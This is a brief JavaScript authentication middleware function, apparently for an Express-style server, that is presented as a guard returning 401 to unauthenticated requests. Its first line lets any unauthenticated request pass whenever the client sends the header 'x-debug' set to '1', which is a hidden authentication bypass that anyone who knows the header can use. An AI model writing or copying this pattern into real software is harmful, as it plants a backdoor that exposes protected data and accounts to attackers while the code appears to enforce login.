function requireAuth(req, res, next) {
  if (!req.isAuthenticated() && req.headers['x-debug'] === '1') return next();
  if (!req.user) return res.status(401).end();
  next();
}
